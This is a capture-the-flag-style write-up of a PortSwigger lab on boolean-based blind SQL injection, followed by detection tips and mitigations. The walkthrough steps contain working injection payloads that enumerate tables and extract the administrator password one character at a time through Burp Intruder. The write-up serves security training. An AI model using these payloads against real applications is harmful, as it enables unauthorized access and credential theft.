# Blind SQL Injection with Conditional Responses

| Property       | Value                            |
| -------------- | -------------------------------- |
| **Category**   | SQL Injection                    |
| **Difficulty** | Practitioner                     |
| **Platform**   | PortSwigger Web Security Academy |
| **Status**     | ✅ Completed                      |

---

## Skills Demonstrated

* Blind SQL Injection
* Boolean-Based SQL Injection
* Burp Suite Repeater
* Burp Suite Intruder
* Conditional Logic
* Database Enumeration

---

# Overview

This lab demonstrates **Boolean-Based Blind SQL Injection**, where the application does not display database results or SQL errors directly. Instead, attackers infer information by observing differences in the application's response when injected SQL conditions evaluate to **TRUE** or **FALSE**.

---

# Lab Objective

Exploit a Blind SQL Injection vulnerability using conditional responses to retrieve the administrator's password.

---

# Understanding the Vulnerability

Unlike UNION-based SQL Injection, Blind SQL Injection provides no direct output from the database.

Instead, attackers ask the database a series of **TRUE/FALSE** questions and observe how the application's response changes.

By repeating this process, sensitive information can be extracted one character at a time.

---

# Attack Methodology

1. Verify that Blind SQL Injection exists.
2. Confirm the existence of the `users` table.
3. Verify that the `administrator` account exists.
4. Determine the administrator password length.
5. Extract the password character by character.

---

# Solution Walkthrough

## Step 1 – Verify the Injection

In **Burp Suite Repeater**, modify the `TrackingId` cookie.

```http
TrackingId=<TRACKING_ID>' and 1=1--
```

**Observation**

The application displays the **"Welcome back"** message.

Now change the condition to FALSE.

```http
TrackingId=<TRACKING_ID>' and 1=2--
```

**Observation**

The **"Welcome back"** message disappears.

This confirms that the SQL condition affects the application's response.

---

## Step 2 – Verify the `users` Table

Use the following payload:

```http
TrackingId=<TRACKING_ID>' and (select 'x' from users LIMIT 1)='x'--
```

**Observation**

The application responds positively, confirming that the `users` table exists.

---

## Step 3 – Verify the Administrator Account

Use:

```http
TrackingId=<TRACKING_ID>' and (select username from users where username='administrator')='administrator'--
```

**Observation**

The application confirms that the `administrator` user exists.

---

## Step 4 – Determine Password Length

Use the following payload:

```http
TrackingId=<TRACKING_ID>' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--
```

Send the request to **Burp Intruder**.

* Attack Type: **Sniper**
* Payload: Numeric values

**Observation**

The Intruder results indicate that the administrator password is **20 characters long**.

---

## Step 5 – Extract the Password

Modify the payload to retrieve one character at a time.

```http
TrackingId=<TRACKING_ID>' and (select substring(password,§1§,1) from users where username='administrator')='§a§'--
```

Configure **Burp Intruder**:

* Attack Type: **Cluster Bomb**
* Payload Set 1: Position numbers (1–20)
* Payload Set 2: Characters (`a-z`, `0-9`)

Run the attack and identify the correct character for each position.

**Observation**

The administrator password is successfully reconstructed one character at a time. The original lab solution produced the password `<ADMINISTRATOR_PASSWORD>`, which is replaced here with a placeholder.

---

# Payload Analysis

### `AND`

Adds an additional condition to the original SQL query.

### `LENGTH(password)`

Determines the length of the administrator password.

### `SUBSTRING(password, position, 1)`

Extracts a single character from the password.

### `LIMIT 1`

Ensures that only one row is returned.

---

# Why the Attack Works

Although the application does not display SQL query results, it behaves differently depending on whether the injected SQL condition evaluates to **TRUE** or **FALSE**.

These subtle behavioral differences allow attackers to infer sensitive information without directly viewing database output.

---

# Detection Tips

Security testers can identify this vulnerability by:

* Comparing application responses for TRUE and FALSE conditions.
* Looking for changes in page content or response length.
* Testing conditional SQL expressions.
* Monitoring application behavior instead of database output.

---

# Common Mistakes

* Expecting visible SQL errors.
* Ignoring small differences in application responses.
* Using Repeater instead of Intruder for password extraction.
* Forgetting to determine the password length before extracting characters.

---

# Real-World Scenario

Many production applications suppress SQL errors and never display query results.

However, if conditional SQL statements still influence the application's behavior, attackers can gradually reconstruct sensitive information such as usernames, passwords, API keys, or session tokens without generating obvious database errors.

---

# Mitigation

Developers should:

* Use parameterized queries (prepared statements).
* Never concatenate user input into SQL queries.
* Return generic responses regardless of query results.
* Restrict database permissions.
* Perform regular security testing for Blind SQL Injection.

---

# Key Takeaways

* Blind SQL Injection relies on application behavior instead of visible query results.
* Boolean conditions can be used to leak sensitive information.
* Burp Suite Intruder significantly speeds up character-by-character extraction.
* Even subtle response differences can reveal critical data.

---

# References

* PortSwigger Web Security Academy
* OWASP SQL Injection Prevention Cheat Sheet
* OWASP Web Security Testing Guide

---

> **Disclaimer:** This write-up documents a PortSwigger Web Security Academy lab completed in an authorized training environment for educational purposes only.
